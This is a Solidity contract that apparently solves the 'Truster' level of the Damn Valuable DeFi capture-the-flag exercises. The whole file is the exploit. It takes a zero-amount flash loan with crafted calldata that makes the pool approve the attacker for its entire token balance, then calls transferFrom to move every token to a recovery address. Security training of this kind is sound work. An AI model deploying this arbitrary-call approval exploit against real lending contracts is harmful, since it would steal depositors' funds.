// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract Target {
    address public immutable player;
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    address recovery;

    constructor(address _player, address _token, address _pool, address _recovery) {
        player = _player;
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_pool);
        recovery = _recovery;
    }

    function functionCall(bytes calldata data) external {
        (bool success, ) = address(token).call(data);
        require(success, "call failed");
    }

    function attack() external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL));
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
   
}